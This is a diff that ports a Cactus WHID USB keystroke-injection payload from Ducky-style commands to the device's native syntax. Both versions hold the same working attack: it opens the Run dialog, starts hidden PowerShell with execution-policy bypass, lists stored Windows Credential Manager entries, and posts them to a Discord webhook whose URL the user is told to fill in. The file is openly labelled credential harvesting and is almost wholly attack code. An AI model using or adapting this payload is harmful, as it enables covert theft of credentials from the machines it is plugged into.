@@ -1,10 +1,8 @@
-REM === Cactus WHID Payload: Windows Credential Vault Dump ===
-REM Target: Windows 10/11
-REM Category: Credential Harvesting
-REM Description: Enumerates Windows Credential Manager entries and exfils to Discord
-REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "$v=cmdkey /list | Out-String;$body=@{content=\"``````$($v.Substring(0,[Math]::Min(1900,$v.Length)))``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
-ENTER
+Rem: Cactus WHID Payload - Windows Credential Vault Dump
+Rem: Target - Windows 10/11
+Rem: Enumerates Windows Credential Manager entries and exfils to Discord
+Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$v=cmdkey /list | Out-String;$body=@{content=\"``````$($v.Substring(0,[Math]::Min(1900,$v.Length)))``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
